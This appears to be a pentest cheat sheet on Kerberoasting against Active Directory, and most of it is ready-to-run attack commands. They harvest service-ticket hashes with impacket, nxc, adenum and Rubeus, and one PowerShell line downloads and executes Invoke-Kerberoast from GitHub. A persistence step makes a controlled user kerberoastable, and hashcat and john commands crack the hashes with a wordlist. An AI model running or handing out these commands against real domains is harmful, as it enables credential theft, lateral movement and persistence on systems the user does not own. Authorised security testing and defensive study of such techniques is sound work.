![](Pasted%20image%2020241116211514.png)
![](Pasted%20image%2020241116211606.png)
![](Pasted%20image%2020241116211637.png)

Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.

> The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/en/blog/how-kerberos-works/).

- [!] To perform this attack, you need an account on the domain

## Attack From Linux

```shell
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

```shell
impacket-GetUserSPNs vuln.local/user1:P@ssw0rd -outputfile hashes.kerberoast
```

```shell
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

```shell
impacket-GetUserSPNs -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

## Attack From Windows

Likewise, Kerberoasting can be performed from a Windows machine with several tools such as Rubeus or Invoke-Kerberoast from Empire project. In this case, tools are launched from the context of a logged user inside a domain workstation. The commands are the following:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```shell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

## Cracking TGS Password

```shell
hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlist/rockyou.txt 
```

```shell
john --format=krb5tgs --wordlist=/usr/share/wordlist/rockyou.txt hashes.kerberoast
```

